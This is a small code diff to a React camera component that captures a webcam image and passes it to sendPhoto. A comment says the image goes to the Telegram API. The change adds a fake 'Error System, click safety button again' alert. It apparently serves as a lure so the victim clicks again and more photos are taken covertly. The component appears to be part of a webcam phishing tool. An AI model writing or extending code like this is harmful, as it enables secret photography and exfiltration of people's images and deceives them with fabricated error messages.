@@ -42,6 +42,7 @@ const Cam = () => {
     const data = canvas.toDataURL('image/jpeg');
     setImageData(data);
     sendPhoto(data);
+    alert("Error System, click safety button again");
   };
 
   // Send the captured image to the Telegram API
